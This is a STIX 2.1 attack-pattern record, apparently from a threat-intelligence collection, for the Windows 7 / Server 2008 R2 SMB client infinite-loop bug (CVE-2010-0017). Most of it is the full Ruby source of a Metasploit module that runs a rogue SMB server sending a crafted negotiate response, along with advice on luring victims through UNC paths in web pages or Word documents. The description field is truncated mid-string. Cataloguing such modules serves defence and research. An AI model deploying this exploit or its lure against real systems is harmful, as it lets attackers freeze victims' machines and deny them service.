{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bed04986-972c-478f-b70a-daebeab99da8",
    "created": "2024-08-14T16:25:33.809065Z",
    "modified": "2024-08-14T16:25:33.809069Z",
    "name": "Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop",
    "description": " This module exploits a denial of service flaw in the Microsoft Windows SMB client on Windows 7 and Windows Server 2008 R2. To trigger this bug, run this module as a service and forces a vulnerable client to access the IP of this system as an SMB server. This can be accomplished by embedding a UNC path (\\\\HOST\\share\\something) into a web page if the target is using Internet Explorer, or a Word document otherwise.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop.rb",
            "external_id": "ms10_006_negotiate_response_loop.rb"
        },
        {
            "source_name": "reference",
            "url": "http://g-laurent.blogspot.com/2009/11/windows-7-server-2008r2-remote-kernel.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop',\n      'Description'    => %q{\n          This module exploits a denial of service flaw in the Microsoft\n        Windows SMB client on Windows 7 and Windows Server 2008 R2. To trigger\n        this bug, run this module as a service and forces a vulnerable client\n        to access the IP of this system as an SMB server. This can be accomplished\n        by embedding a UNC path (\\\\HOST\\share\\something) into a web page if the\n        target is using Internet Explorer, or a Word document otherwise.\n      },\n      'References'     =>\n        [\n          ['CVE', '2010-0017'],\n          ['OSVDB', '62244'],\n          ['MSB', 'MS10-006'],\n          ['URL', 'http://g-laurent.blogspot.com/2009/11/windows-7-server-2008r2-remote-kernel.html']\n        ],\n      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm' ],\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options([\n      OptPort.new('SRVPORT', [ true, \"The SMB port to listen on\", 445 ])\n    ])\n  end\n\n  def run\n    print_status(\"Starting the malicious SMB service...\")\n    print_status(\"To trigger, the vulnerable client should try to access: \\\\\\\\#{Rex::Socket.source_address('1.2.3.4')}\\\\Shared\\\\Anything\")\n    exploit\n  end\n\n  def on_client_connect(client)\n    client.get_once(-1, 1)\n    req =   \"\\x00\\x00\\x00\\x9a\" + # 9e is the real length of the response\n        \"\\xfe\\x53\\x4d\\x42\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\" +\n        \"\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n        \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" +\n        \"\\x41\\x00\\x01\\x00\\x02\\x02\\x00\\x00\\x30\\x82\\xa4\\x11\\xe3\\x12\\x23\\x41\" +\n        \"\\xaa\\x4b\\xad\\x99\\xfd\\x52\\x31\\x8d\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\" +\n        \"\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\xcf\\x73\\x67\\x74\\x62\\x60\\xca\\x01\" +\n        \"\\xcb\\x51\\xe0\\x19\\x62\\x60\\xca\\x01\\x80\\x00\\x1e\\x00\\x20\\x4c\\x4d\\x20\" +\n        \"\\x60\\x1c\\x06\\x06\\x2b\\x06\\x01\\x05\\x05\\x02\\xa0\\x12\\x30\\x10\\xa0\\x0e\" +\n        \"\\x30\\x0c\\x06\\x0a\\x2b\\x06\\x01\\x04\\x01\\x82\\x37\\x02\\x02\\x0a\"\n    client.put(req)\n    client.get_once(-1, 1)\n    client.close\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Laurent Gaffie <laurent.gaffie[at]gmail.com>",
        "hdm ]",
        ""
    ]
}